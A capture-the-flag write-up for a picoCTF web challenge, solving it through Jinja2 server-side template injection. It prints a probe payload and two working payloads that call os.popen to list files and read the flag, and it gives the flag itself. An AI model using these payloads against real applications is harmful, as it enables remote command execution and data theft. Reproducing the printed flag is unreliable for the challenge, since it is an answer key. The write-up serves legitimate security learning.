https://play.picoctf.org/practice/challenge/492
## Description
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53849/)!
## Solution
1. Go to the website.
2. Intercept a post method to an announce:
	1. Upload this payload to test of Jinja2 `{{7*'7'}}`. It returns `7777777` so it is a engine Jinja2 Python.
	2. We list all its files, we us os.popen because it worked, it is reacheable in the context:
		`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read() }}`
		We can see that there is a a file *flag* so we try to read it.
		![](../../../../images/Pasted%20image%2020251004150950.png)
	3. With the payload we read the file *flag* :
		```content={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}```
		![](../../../../images/Pasted%20image%2020251004151104.png)

		Flag: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}`
## Additional notes
## References

https://portswigger.net/web-security/server-side-template-injection
https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation